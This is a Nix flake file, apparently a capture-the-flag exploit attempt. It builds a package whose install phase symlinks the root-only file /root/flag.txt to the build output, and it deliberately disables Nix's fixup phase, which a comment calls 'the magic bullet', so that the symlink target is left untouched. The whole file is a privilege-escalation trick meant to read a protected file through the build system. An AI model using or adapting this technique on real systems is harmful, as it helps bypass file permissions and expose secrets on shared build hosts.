{
  description = "Direct Symlink Dereference Attack (No Fixup)";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }: 
  let
    system = "x86_64-linux";
    pkgs = import nixpkgs { inherit system; };
  in {
    packages.${system}.default = pkgs.stdenv.mkDerivation {
      pname = "direct-symlink";
      version = "1.0";
      src = ./.;

      # Disable the default phases that might interact with our symlink
      dontConfigure = true;
      dontBuild = true;
      
      # THE MAGIC BULLET: Stop Nix from chown/chmod-ing the symlink target
      dontFixup = true; 

      installPhase = ''
        ln -s /root/flag.txt $out
      '';
    };
  };
}
